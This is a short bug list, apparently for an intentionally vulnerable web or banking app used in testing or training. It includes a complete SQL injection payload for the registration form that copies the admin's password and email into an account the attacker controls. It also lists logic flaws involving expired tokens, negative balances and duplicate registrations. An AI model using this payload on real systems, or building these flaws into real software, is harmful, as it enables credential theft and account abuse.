-----------------
BUG_1: SQL injection in register

Example:
firstname:  '+ (SELECT password	FROM users WHERE firstname = 'admin' )	,(SELECT email FROM users WHERE firstname = 'admin'	),'myemail@o2.pl','mypass') --','last','email','pass'); --
lastname: whatever
email: whatever
password: whatever

In database must exist admin account.

BUG_2

-----------------


Constant bugs:

- Expired token is not removed. In this case user will be able to see details of account on which he was previously logged on
- You can windraw more money than you have (negative balance)
- User can register account with email and password which was added to DB before. (during the login operator he will be redirected to first account found in db)
